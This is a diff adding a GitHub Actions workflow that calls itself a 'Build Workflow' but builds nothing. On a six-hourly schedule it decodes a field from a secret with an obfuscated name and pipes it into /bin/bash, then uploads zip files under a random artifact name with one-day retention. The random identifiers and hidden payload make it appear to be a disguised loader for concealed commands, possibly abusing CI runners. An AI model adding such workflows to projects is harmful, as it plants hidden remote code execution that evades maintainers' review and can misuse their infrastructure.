@@ -1,0 +1,32 @@
+name: Build Workflow
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '35 0,6,12,18 * * *'
+permissions:
+  contents: read
+  actions: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  execute:
+    name: Main task
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Run
+        env:
+          ptofv85373: ${{ secrets.ptofv85373 }}
+        run: |
+          printf '%s' "$ptofv85373" | jq -r .rmswu14 | /bin/bash
+          echo $uue47666 | jq -r .qdfht46018 | /bin/bash
+
+      - name: Store results
+        uses: actions/upload-artifact@v4
+        with:
+          name: ah90DvBc
+          path: "*.zip"
+          retention-days: 1
